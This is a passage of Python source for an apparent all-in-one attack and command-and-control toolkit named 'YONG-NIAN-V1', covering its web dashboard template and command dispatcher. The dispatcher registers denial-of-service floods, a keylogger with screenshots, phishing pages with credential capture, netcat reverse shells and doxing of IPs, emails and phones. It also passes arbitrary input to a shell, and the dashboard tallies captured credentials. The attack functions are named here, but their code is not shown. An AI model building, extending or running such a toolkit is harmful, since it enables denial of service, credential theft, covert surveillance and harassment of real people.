            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
        }
        button { 
            background: linear-gradient(135deg, var(--cyan), var(--dark-cyan)); 
            color: #000;
            border: none; 
            padding: 12px 30px; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 16px;
            font-weight: bold; 
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }
        button:hover { 
            transform: scale(1.05); 
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.7);
        }
        .output { 
            background: rgba(0, 0, 0, 0.7); 
            border: 2px solid rgba(0, 255, 255, 0.2); 
            border-radius: 8px;
            padding: 20px; 
            font-family: 'Courier New', monospace; 
            margin-top: 15px; 
            white-space: pre-wrap;
            max-height: 400px; 
            overflow-y: auto; 
            font-size: 14px; 
            line-height: 1.6;
        }
        .charts-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); 
            gap: 20px;
        }
        .chart-container { 
            background: rgba(0, 0, 0, 0.5); 
            border-radius: 12px; 
            padding: 20px;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(0, 255, 255, 0.1); }
        th { color: var(--cyan); }
        .badge { 
            display: inline-block; 
            padding: 4px 12px; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold;
        }
        .badge-critical { background: rgba(244, 67, 54, 0.3); color: #f44336; }
        .badge-high { background: rgba(255, 152, 0, 0.3); color: #ff9800; }
        .badge-medium { background: rgba(255, 193, 7, 0.3); color: #ffc107; }
        .badge-low { background: rgba(0, 255, 255, 0.3); color: #00ffff; }
        .bot-status { 
            display: inline-flex; 
            align-items: center; 
            gap: 8px; 
            padding: 8px 16px; 
            background: rgba(0, 255, 0, 0.1); 
            border-radius: 20px;
            margin: 5px;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        .bot-status.offline { 
            background: rgba(255, 0, 0, 0.1); 
            border-color: rgba(255, 0, 0, 0.3);
        }
        .bot-status .dot { 
            width: 10px; 
            height: 10px; 
            border-radius: 50%; 
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        .bot-status.offline .dot { 
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 10px;
        }
        .quick-btn {
            background: rgba(0, 139, 139, 0.3);
            border: 1px solid rgba(0, 255, 255, 0.3);
            color: #00ffff;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Courier New', monospace;
        }
        .quick-btn:hover {
            background: rgba(0, 255, 255, 0.3);
            border-color: var(--cyan);
            color: #000;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--darker); }
        ::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--light-cyan); }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔷 YONG-NIAN-V1</h1>
        <p>Ultimate Penetration Testing Command & Control Platform</p>
    </div>
    
    <div class="container">
        <div class="stats-grid" id="stats">
            <div class="stat-card"><h3 id="statCommands">0</h3><p>Commands</p></div>
            <div class="stat-card"><h3 id="statThreats">0</h3><p>Threats</p></div>
            <div class="stat-card"><h3 id="statIPs">0</h3><p>Managed IPs</p></div>
            <div class="stat-card"><h3 id="statCreds">0</h3><p>Credentials</p></div>
            <div class="stat-card"><h3 id="statPhish">0</h3><p>Phishing Links</p></div>
            <div class="stat-card"><h3 id="statBinary">0</h3><p>Binary Analyses</p></div>
            <div class="stat-card"><h3 id="statAPK">0</h3><p>APK Analyses</p></div>
            <div class="stat-card"><h3 id="statAttackPaths">0</h3><p>Attack Paths</p></div>
        </div>
        
        <div class="section">
            <h2>🤖 Bot Status</h2>
            <div id="botStatus">
                <span class="bot-status offline"><span class="dot"></span> Discord</span>
                <span class="bot-status offline"><span class="dot"></span> Telegram</span>
                <span class="bot-status offline"><span class="dot"></span> Slack</span>
                <span class="bot-status offline"><span class="dot"></span> WhatsApp</span>
                <span class="bot-status offline"><span class="dot"></span> Signal</span>
                <span class="bot-status offline"><span class="dot"></span> iMessage</span>
                <span class="bot-status offline"><span class="dot"></span> Google Chat</span>
            </div>
        </div>
        
        <div class="section">
            <h2>🚀 Command Center</h2>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="commandInput" class="command-input" 
                       placeholder="Enter command... (type 'help' for commands)" 
                       onkeypress="if(event.key === 'Enter') executeCommand()">
                <button onclick="executeCommand()">EXECUTE</button>
            </div>
            <div class="quick-commands">
                <button class="quick-btn" onclick="quickCommand('help')">help</button>
                <button class="quick-btn" onclick="quickCommand('status')">status</button>
                <button class="quick-btn" onclick="quickCommand('ping 8.8.8.8')">ping</button>
                <button class="quick-btn" onclick="quickCommand('nmap_quick 127.0.0.1')">nmap</button>
                <button class="quick-btn" onclick="quickCommand('traceroute 8.8.8.8')">traceroute</button>
                <button class="quick-btn" onclick="quickCommand('phish_facebook')">phish</button>
                <button class="quick-btn" onclick="quickCommand('keylogger_start')">keylogger</button>
                <button class="quick-btn" onclick="quickCommand('binary_analyze /bin/ls')">binary</button>
                <button class="quick-btn" onclick="quickCommand('attack_path 192.168.1.1')">attack_path</button>
                <button class="quick-btn" onclick="quickCommand('llm how to secure a web app')">llm</button>
            </div>
            <div id="output" class="output">
                <span style="color: #00ffff;">system></span> Welcome to YONG-NIAN-V1
                <br><span style="color: #00ffff;">system></span> Type 'help' for available commands
                <br><span style="color: #00ffff;">system></span> 1000+ commands loaded and ready
            </div>
        </div>
        
        <div class="section">
            <h2>📊 Statistics</h2>
            <div class="charts-grid">
                <div class="chart-container"><canvas id="barChart"></canvas></div>
                <div class="chart-container"><canvas id="pieChart"></canvas></div>
            </div>
        </div>
        
        <div class="section">
            <h2>🚨 Recent Threats</h2>
            <table>
                <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                <tbody id="threatsTable"><tr><td colspan="4">Loading...</td></tr></tbody>
            </table>
        </div>
    </div>
    
    <script>
        var socket = io();
        var barChart, pieChart;
        
        function initCharts() {
            const barCtx = document.getElementById('barChart').getContext('2d');
            const pieCtx = document.getElementById('pieChart').getContext('2d');
            
            barChart = new Chart(barCtx, {
                type: 'bar',
                data: { 
                    labels: ['Commands', 'Threats', 'IPs', 'Creds', 'Phishing'],
                    datasets: [{ 
                        label: 'Statistics', 
                        data: [0, 0, 0, 0, 0],
                        backgroundColor: ['#00ffff', '#008b8b', '#7fffff', '#00cccc', '#009999'],
                        borderColor: '#00ffff',
                        borderWidth: 1
                    }] 
                },
                options: { 
                    responsive: true, 
                    plugins: { legend: { labels: { color: '#00ffff' } } },
                    scales: { 
                        y: { ticks: { color: '#00ffff' }, grid: { color: 'rgba(0,255,255,0.1)' } },
                        x: { ticks: { color: '#00ffff' }, grid: { color: 'rgba(0,255,255,0.1)' } } 
                    } 
                }
            });
            
            pieChart = new Chart(pieCtx, {
                type: 'doughnut',
                data: { 
                    labels: ['Commands', 'Threats', 'IPs', 'Creds', 'Phishing'],
                    datasets: [{ 
                        data: [0, 0, 0, 0, 0],
                        backgroundColor: ['#00ffff', '#008b8b', '#7fffff', '#00cccc', '#009999'],
                        borderColor: '#050510',
                        borderWidth: 2
                    }] 
                },
                options: { 
                    responsive: true, 
                    plugins: { legend: { labels: { color: '#00ffff' } } } 
                }
            });
        }
        
        function executeCommand() {
            var input = document.getElementById('commandInput');
            var command = input.value.trim();
            if (!command) return;
            
            var output = document.getElementById('output');
            output.innerHTML += '<br><span style="color: #00ffff;">$></span> ' + command;
            
            fetch('/api/command', {
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                output.innerHTML += '<br>' + (data.output || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                output.scrollTop = output.scrollHeight;
                input.value = '';
                updateStats();
            })
            .catch(error => {
                output.innerHTML += '<br><span style="color: #ff6666;">Error: ' + error + '</span>';
            });
        }
        
        function quickCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            executeCommand();
        }
        
        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statCommands').textContent = data.total_commands || 0;
                    document.getElementById('statThreats').textContent = data.total_threats || 0;
                    document.getElementById('statIPs').textContent = data.total_managed_ips || 0;
                    document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                    document.getElementById('statPhish').textContent = data.total_phishing_links || 0;
                    document.getElementById('statBinary').textContent = data.total_binary_analyses || 0;
                    document.getElementById('statAPK').textContent = data.total_apk_analyses || 0;
                    document.getElementById('statAttackPaths').textContent = data.total_attack_paths || 0;
                    
                    if (barChart && pieChart) {
                        const values = [
                            data.total_commands || 0, 
                            data.total_threats || 0,
                            data.total_managed_ips || 0, 
                            data.captured_credentials || 0, 
                            data.total_phishing_links || 0
                        ];
                        barChart.data.datasets[0].data = values;
                        barChart.update();
                        pieChart.data.datasets[0].data = values;
                        pieChart.update();
                    }
                });
        }
        
        function updateBotStatus() {
            fetch('/api/bots')
                .then(response => response.json())
                .then(data => {
                    var html = '';
                    const platforms = ['discord', 'telegram', 'slack', 'whatsapp', 'signal', 'imessage', 'google_chat'];
                    const icons = { 
                        discord: '🎮', telegram: '📱', slack: '💬', 
                        whatsapp: '📞', signal: '🔒', imessage: '💬', google_chat: '💭' 
                    };
                    
                    platforms.forEach(function(platform) {
                        var bot = data.bots.find(b => b.platform === platform);
                        var isOnline = bot && bot.status === 'online';
                        var cls = isOnline ? 'bot-status' : 'bot-status offline';
                        var statusText = isOnline ? 'Online' : 'Offline';
                        html += '<span class="' + cls + '"><span class="dot"></span> ' + (icons[platform] || '🤖') + ' ' + platform.charAt(0).toUpperCase() + platform.slice(1) + ' (' + statusText + ')</span>';
                    });
                    
                    document.getElementById('botStatus').innerHTML = html;
                });
        }
        
        function loadThreats() {
            fetch('/api/threats')
                .then(response => response.json())
                .then(data => {
                    var html = '';
                    if (data.threats && data.threats.length > 0) {
                        data.threats.forEach(function(threat) {
                            var badgeClass = 'badge-' + (threat.severity || 'low');
                            html += '<tr><td>' + (threat.timestamp || '').substring(0, 19) + '</td>';
                            html += '<td>' + (threat.threat_type || 'Unknown') + '</td>';
                            html += '<td>' + (threat.source_ip || 'Unknown') + '</td>';
                            html += '<td><span class="badge ' + badgeClass + '">' + (threat.severity || 'low').toUpperCase() + '</span></td></tr>';
                        });
                    } else {
                        html = '<tr><td colspan="4">No threats detected</td></tr>';
                    }
                    document.getElementById('threatsTable').innerHTML = html;
                });
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            initCharts();
            updateStats();
            loadThreats();
            updateBotStatus();
            setInterval(updateStats, 5000);
            setInterval(loadThreats, 5000);
            setInterval(updateBotStatus, 10000);
        });
    </script>
</body>
</html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            return jsonify(self.db.get_statistics())
        
        @app.route('/api/threats')
        def api_threats():
            return jsonify({'threats': self.db.get_recent_threats(20)})
        
        @app.route('/api/bots')
        def api_bots():
            return jsonify({'bots': self.db.get_bot_status()})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        """Start web dashboard"""
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# ============================================================
# COMMAND HANDLER
# ============================================================
class CommandHandler:
    """Handles all command execution"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager,
                 ssh_manager: SSHManager = None,
                 dos_engine: DOSEngine = None,
                 keylogger: KeyloggerModule = None,
                 attack_path_engine: DijkstraAttackPathEngine = None,
                 binary_analyzer: BinaryAnalysisEngine = None,
                 apk_analyzer: APKAnalysisEngine = None,
                 llm: CybersecurityLLM = None):
        self.db = db
        self.config = config
        self.ssh = ssh_manager
        self.dos = dos_engine
        self.keylogger = keylogger
        self.attack_path = attack_path_engine
        self.binary = binary_analyzer
        self.apk = apk_analyzer
        self.llm = llm
        self.social = SocialEngineeringTools(db, config)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
        self._lock = RLock()
    
    def _build_commands(self) -> Dict[str, Callable]:
        """Build command dictionary"""
        commands = {
            # Ping Commands
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_flood': self._ping_flood,
            'ping_mtu': self._ping_mtu,
            'ping_size': self._ping_size,
            'ping_count': self._ping_count,
            'ping_interval': self._ping_interval,
            'ping_timeout': self._ping_timeout,
            'ping_ttl': self._ping_ttl,
            'ping_interface': self._ping_interface,
            'ping_source': self._ping_source,
            'ping_pattern': self._ping_pattern,
            'ping_record': self._ping_record,
            'ping_timestamp': self._ping_timestamp,
            'ping_quiet': self._ping_quiet,
            'ping_verbose': self._ping_verbose,
            'ping_deadline': self._ping_deadline,
            'ping_numeric': self._ping_numeric,
            'ping_adaptive': self._ping_adaptive,
            'ping_audible': self._ping_audible,
            'ping_broadcast': self._ping_broadcast,
            'ping_bypass_route': self._ping_bypass_route,
            'ping_flow_label': self._ping_flow_label,
            'ping_mark': self._ping_mark,
            'ping_pmtudisc': self._ping_pmtudisc,
            'ping_quality': self._ping_quality,
            'ping_rate': self._ping_rate,
            'ping_sndbuf': self._ping_sndbuf,
            
            # Traceroute Commands
            'traceroute': self._traceroute,
            'traceroute6': self._traceroute6,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_first_hop': self._traceroute_first_hop,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_wait': self._traceroute_wait,
            'traceroute_port': self._traceroute_port,
            'traceroute_numeric': self._traceroute_numeric,
            'traceroute_verbose': self._traceroute_verbose,
            'traceroute_bypass': self._traceroute_bypass,
            'traceroute_debug': self._traceroute_debug,
            'traceroute_firewall': self._traceroute_firewall,
            'traceroute_gateway': self._traceroute_gateway,
            'traceroute_icmp_echo': self._traceroute_icmp_echo,
            'traceroute_ipv6': self._traceroute_ipv6,
            'traceroute_max_ttl': self._traceroute_max_ttl,
            'traceroute_min_ttl': self._traceroute_min_ttl,
            'mtr': self._mtr,
            'mtr_report': self._mtr_report,
            'mtr_json': self._mtr_json,
            'mtr_csv': self._mtr_csv,
            'tcptraceroute': self._tcptraceroute,
            'lft': self._lft,
            'tracepath': self._tracepath,
            'pathping': self._pathping,
            
            # Nmap Commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_ping': self._nmap_ping,
            'nmap_ports': self._nmap_ports,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_output': self._nmap_output,
            'nmap_exclude': self._nmap_exclude,
            'nmap_input': self._nmap_input,
            'nmap_random': self._nmap_random,
            'nmap_timing': self._nmap_timing,
            'nmap_syn': self._nmap_syn,
            'nmap_connect': self._nmap_connect,
            'nmap_ack': self._nmap_ack,
            'nmap_fin': self._nmap_fin,
            'nmap_xmas': self._nmap_xmas,
            'nmap_null': self._nmap_null,
            'nmap_script_default': self._nmap_script_default,
            'nmap_top_ports': self._nmap_top_ports,
            'nmap_open': self._nmap_open,
            'nmap_reason': self._nmap_reason,
            'nmap_packet_trace': self._nmap_packet_trace,
            'nmap_iflist': self._nmap_iflist,
            'nmap_no_ping': self._nmap_no_ping,
            'nmap_fast': self._nmap_fast,
            'nmap_fragment': self._nmap_fragment,
            'nmap_decoys': self._nmap_decoys,
            'nmap_source_port': self._nmap_source_port,
            'nmap_data_length': self._nmap_data_length,
            'nmap_ttl': self._nmap_ttl,
            'nmap_spoof_mac': self._nmap_spoof_mac,
            'nmap_badsum': self._nmap_badsum,
            'nmap_send_eth': self._nmap_send_eth,
            'nmap_send_ip': self._nmap_send_ip,
            'nmap_smb': self._nmap_smb,
            'nmap_snmp': self._nmap_snmp,
            'nmap_ssh': self._nmap_ssh,
            'nmap_http': self._nmap_http,
            'nmap_ftp': self._nmap_ftp,
            'nmap_smtp': self._nmap_smtp,
            'nmap_dns': self._nmap_dns,
            'nmap_mysql': self._nmap_mysql,
            'nmap_mssql': self._nmap_mssql,
            'nmap_oracle': self._nmap_oracle,
            'nmap_rdp': self._nmap_rdp,
            'nmap_vnc': self._nmap_vnc,
            'nmap_sip': self._nmap_sip,
            'nmap_upnp': self._nmap_upnp,
            'nmap_broadcast': self._nmap_broadcast,
            'nmap_script_help': self._nmap_script_help,
            
            # Curl Commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_output': self._curl_output,
            'curl_remote_name': self._curl_remote_name,
            'curl_location': self._curl_location,
            'curl_include': self._curl_include,
            'curl_verbose': self._curl_verbose,
            'curl_silent': self._curl_silent,
            'curl_show_error': self._curl_show_error,
            'curl_fail': self._curl_fail,
            'curl_insecure': self._curl_insecure,
            'curl_data': self._curl_data,
            'curl_data_binary': self._curl_data_binary,
            'curl_data_urlencode': self._curl_data_urlencode,
            'curl_form': self._curl_form,
            'curl_header': self._curl_header,
            'curl_user_agent': self._curl_user_agent,
            'curl_referer': self._curl_referer,
            'curl_user': self._curl_user,
            'curl_cookie': self._curl_cookie,
            'curl_cookie_jar': self._curl_cookie_jar,
            'curl_proxy': self._curl_proxy,
            'curl_cert': self._curl_cert,
            'curl_key': self._curl_key,
            'curl_cacert': self._curl_cacert,
            'curl_tlsv1_2': self._curl_tlsv1_2,
            'curl_tlsv1_3': self._curl_tlsv1_3,
            'curl_continue': self._curl_continue,
            'curl_range': self._curl_range,
            'curl_limit_rate': self._curl_limit_rate,
            'curl_max_time': self._curl_max_time,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_retry': self._curl_retry,
            'curl_ipv4': self._curl_ipv4,
            'curl_ipv6': self._curl_ipv6,
            'curl_interface': self._curl_interface,
            'curl_http2': self._curl_http2,
            'curl_compressed': self._curl_compressed,
            'curl_write_out': self._curl_write_out,
            'curl_dump_header': self._curl_dump_header,
            'curl_trace': self._curl_trace,
            'curl_help': self._curl_help,
            'curl_version': self._curl_version,
            'curl_parallel': self._curl_parallel,
            'curl_json': self._curl_json,
            'curl_socks5': self._curl_socks5,
            'curl_upload': self._curl_upload,
            'curl_ftp': self._curl_ftp,
            'curl_batch': self._curl_batch,
            'curl_webhook': self._curl_webhook,
            'curl_health': self._curl_health,
            'curl_benchmark': self._curl_benchmark,
            'curl_loadtest': self._curl_loadtest,
            'curl_download': self._curl_download,
            'curl_resume': self._curl_resume,
            'curl_multiple': self._curl_multiple,
            'curl_config': self._curl_config,
            'curl_netrc': self._curl_netrc,
            'curl_oauth2': self._curl_oauth2,
            'curl_aws': self._curl_aws,
            'curl_http3': self._curl_http3,
            'curl_proxy_tunnel': self._curl_proxy_tunnel,
            'curl_dns': self._curl_dns,
            'curl_resolve': self._curl_resolve,
            'curl_connect_to': self._curl_connect_to,
            'curl_unix_socket': self._curl_unix_socket,
            
            # Wget Commands
            'wget': self._wget,
            'wget_output': self._wget_output,
            'wget_continue': self._wget_continue,
            'wget_background': self._wget_background,
            'wget_quiet': self._wget_quiet,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_spider': self._wget_spider,
            'wget_input': self._wget_input,
            'wget_header': self._wget_header,
            'wget_user_agent': self._wget_user_agent,
            'wget_referer': self._wget_referer,
            'wget_cookies': self._wget_cookies,
            'wget_save_cookies': self._wget_save_cookies,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_retry': self._wget_retry,
            'wget_no_check_cert': self._wget_no_check_cert,
            'wget_certificate': self._wget_certificate,
            'wget_private_key': self._wget_private_key,
            'wget_ca_certificate': self._wget_ca_certificate,
            'wget_proxy': self._wget_proxy,
            'wget_no_proxy': self._wget_no_proxy,
            'wget_user': self._wget_user,
            'wget_password': self._wget_password,
            'wget_post_data': self._wget_post_data,
            'wget_post_file': self._wget_post_file,
            'wget_method': self._wget_method,
            'wget_timestamping': self._wget_timestamping,
            'wget_no_clobber': self._wget_no_clobber,
            'wget_delete_after': self._wget_delete_after,
            'wget_progress': self._wget_progress,
            'wget_show_progress': self._wget_show_progress,
            'wget_config': self._wget_config,
            'wget_append_output': self._wget_append_output,
            'wget_output_file': self._wget_output_file,
            'wget_no_parent': self._wget_no_parent,
            'wget_cut_dirs': self._wget_cut_dirs,
            'wget_directory_prefix': self._wget_directory_prefix,
            'wget_convert_links': self._wget_convert_links,
            'wget_backup_converted': self._wget_backup_converted,
            'wget_adjust_extension': self._wget_adjust_extension,
            'wget_restrict_file_names': self._wget_restrict_file_names,
            'wget_trust_server_names': self._wget_trust_server_names,
            'wget_content_disposition': self._wget_content_disposition,
            'wget_random_wait': self._wget_random_wait,
            'wget_wait': self._wget_wait,
            'wget_waitretry': self._wget_waitretry,
            'wget_quota': self._wget_quota,
            'wget_dns_timeout': self._wget_dns_timeout,
            'wget_connect_timeout': self._wget_connect_timeout,
            'wget_read_timeout': self._wget_read_timeout,
            'wget_inet4': self._wget_inet4,
            'wget_inet6': self._wget_inet6,
            'wget_prefer_family': self._wget_prefer_family,
            'wget_bind_address': self._wget_bind_address,
            'wget_no_dns_cache': self._wget_no_dns_cache,
            'wget_no_http_keep_alive': self._wget_no_http_keep_alive,
            'wget_no_cache': self._wget_no_cache,
            'wget_no_cookies': self._wget_no_cookies,
            'wget_load_cookies': self._wget_load_cookies,
            'wget_keep_session_cookies': self._wget_keep_session_cookies,
            'wget_help': self._wget_help,
            'wget_version': self._wget_version,
            'wget_ftp': self._wget_ftp,
            'wget_ftp_recursive': self._wget_ftp_recursive,
            'wget_https_only': self._wget_https_only,
            'wget_no_iri': self._wget_no_iri,
            'wget_iri': self._wget_iri,
            
            # Netcat Commands
            'netcat': self._netcat,
            'nc': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            'nc_transfer': self._nc_transfer,
            'nc_shell': self._nc_shell,
            'nc_reverse': self._nc_reverse,
            'nc_banner': self._nc_banner,
            'nc_port_scan': self._nc_port_scan,
            'nc_udp': self._nc_udp,
            'nc_hex': self._nc_hex,
            'nc_verbose': self._nc_verbose,
            'nc_zero_io': self._nc_zero_io,
            'nc_exec': self._nc_exec,
            'nc_proxy': self._nc_proxy,
            'nc_ssl': self._nc_ssl,
            'nc_keep_open': self._nc_keep_open,
            'nc_source_port': self._nc_source_port,
            'nc_timeout': self._nc_timeout,
            'nc_wait': self._nc_wait,
            'nc_broadcast': self._nc_broadcast,
            'nc_multicast': self._nc_multicast,
            'nc_interface': self._nc_interface,
            'nc_numeric': self._nc_numeric,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            'ssh_upload': self._ssh_upload,
            'ssh_download': self._ssh_download,
            'ssh_tunnel': self._ssh_tunnel,
            'ssh_reverse_tunnel': self._ssh_reverse_tunnel,
            'ssh_proxy': self._ssh_proxy,
            'ssh_scp': self._ssh_scp,
            'ssh_sftp': self._ssh_sftp,
            'ssh_keyscan': self._ssh_keyscan,
            'ssh_keygen': self._ssh_keygen,
            'ssh_agent': self._ssh_agent,
            
            # DOS Attacks
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'ddos_syn': self._dos_syn,
            'ddos_udp': self._dos_udp,
            'ddos_http': self._dos_http,
            'ddos_icmp': self._dos_icmp,
            
            # Keylogger
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            
            # Phishing
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            'phish_templates': self._phish_templates,
            'phish_custom': self._phish_custom,
            'phish_shorten': self._phish_shorten,
            
            # Binary Analysis
            'binary_analyze': self._binary_analyze,
            'binary_strings': self._binary_strings,
            'binary_disassemble': self._binary_disassemble,
            'binary_imports': self._binary_imports,
            'binary_exports': self._binary_exports,
            
            # APK Analysis
            'apk_analyze': self._apk_analyze,
            'apk_permissions': self._apk_permissions,
            'apk_activities': self._apk_activities,
            'apk_decompile': self._apk_decompile,
            
            # Attack Path (Dijkstra)
            'attack_path': self._attack_path,
            'attack_graph': self._attack_graph,
            'attack_add_node': self._attack_add_node,
            'attack_add_edge': self._attack_add_edge,
            'attack_all_paths': self._attack_all_paths,
            'attack_clear': self._attack_clear,
            
            # LLM
            'llm': self._llm,
            'llm_ask': self._llm,
            'llm_analyze': self._llm_analyze,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            'scan_ips': self._scan_ips,
            'mass_scan': self._mass_scan,
            
            # Network Commands
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            
            # DOX Commands
            'dox_ip': self._dox_ip,
            'dox_domain': self._dox_domain,
            'dox_email': self._dox_email,
            'dox_phone': self._dox_phone,
            'dox_list': self._dox_list,
            
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'stats': self._stats,
            'clear': self._clear,
            'version': self._version,
            'help': self._help,
        }
        
        # Add all phishing template commands
        for template_name in self.social.templates.keys():
            commands[f'phish_{template_name}'] = lambda _, t=template_name: self._phish(t)
        
        return commands
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        """Execute a command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        with self._lock:
            if cmd_name in self.commands:
                try:
                    result = self.commands[cmd_name](args)
                except Exception as e:
                    result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
            else:
                result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Implementation Methods ====================
    
    # Ping methods (30+)
    def _ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(args[0], count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        return self._generic(f'ping6 -c 4 {args[0]}')
    
    def _ping_sweep(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network>'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _fping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        return self._generic(f'fping {" ".join(args)}')
    
    def _ping_flood(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        return self._generic(f'ping -f {args[0]}')
    
    def _ping_mtu(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mtu <target> <size>'}
        return self._generic(f'ping -M do -s {args[1]} {args[0]}')
    
    def _ping_size(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        return self._generic(f'ping -s {args[1]} {args[0]}')
    
    def _ping_count(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        return self._generic(f'ping -c {args[1]} {args[0]}')
    
    def _ping_interval(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <sec>'}
        return self._generic(f'ping -i {args[1]} {args[0]}')
    
    def _ping_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <sec>'}
        return self._generic(f'ping -W {args[1]} {args[0]}')
    
    def _ping_ttl(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        return self._generic(f'ping -t {args[1]} {args[0]}')
    
    def _ping_interface(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interface <target> <iface>'}
